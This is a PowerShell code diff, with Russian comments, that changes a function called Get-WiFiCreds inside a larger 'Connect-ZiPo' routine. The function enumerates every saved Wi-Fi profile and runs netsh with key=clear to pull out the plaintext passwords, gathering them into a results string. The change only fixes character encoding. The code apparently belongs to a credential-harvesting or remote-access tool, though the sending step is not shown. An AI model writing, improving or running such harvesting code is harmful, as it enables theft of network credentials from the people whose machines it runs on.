@@ -84,11 +84,19 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        $profilesFile = "$env:TEMP\wifi_profiles.txt"
-        cmd /c "netsh wlan show profiles > `"$profilesFile`"" | Out-Null
-        $lines = Get-Content $profilesFile -Encoding Default
+        $rawFile = "$env:TEMP\wifi_raw.txt"
+        $utfFile = "$env:TEMP\wifi_utf.txt"
 
-        # Отбираем строки, где есть имя профиля
+        # Получаем список профилей
+        cmd /c "netsh wlan show profiles > `"$rawFile`"" | Out-Null
+
+        # Принудительно перекодируем из OEM в UTF-8
+        $bytes = [System.IO.File]::ReadAllBytes($rawFile)
+        $text = [System.Text.Encoding]::GetEncoding(866).GetString($bytes)
+        [System.IO.File]::WriteAllText($utfFile, $text, [System.Text.Encoding]::UTF8)
+
+        # Читаем уже нормальный текст
+        $lines = Get-Content $utfFile -Encoding UTF8
         $profiles = $lines | Where-Object { $_ -like "*:*" -and $_ -match "Profile" }
 
         if (-not $profiles -or $profiles.Count -eq 0) {
@@ -103,13 +111,16 @@ function Connect-ZiPo {
 
             $results += "`n[$profile]`n"
 
-            $profileFile = "$env:TEMP\wifi_profile_$($profile).txt"
-            cmd /c "netsh wlan show profile name=""$profile"" key=clear > `"$profileFile`"" | Out-Null
-            $details = Get-Content $profileFile -Encoding Default
+            $rawDetail = "$env:TEMP\wifi_detail_raw.txt"
+            $utfDetail = "$env:TEMP\wifi_detail_utf.txt"
 
-            $keyLine = $details | Where-Object {
-                $_ -like "*Key Content*" -or $_ -like "*Содержимое ключа*"
-            }
+            cmd /c "netsh wlan show profile name=""$profile"" key=clear > `"$rawDetail`"" | Out-Null
+            $bytes2 = [System.IO.File]::ReadAllBytes($rawDetail)
+            $text2 = [System.Text.Encoding]::GetEncoding(866).GetString($bytes2)
+            [System.IO.File]::WriteAllText($utfDetail, $text2, [System.Text.Encoding]::UTF8)
+
+            $detailLines = Get-Content $utfDetail -Encoding UTF8
+            $keyLine = $detailLines | Where-Object { $_ -like "*Key Content*" -or $_ -like "*Содержимое ключа*" }
 
             if ($keyLine) {
                 $results += ($keyLine -join "`n")
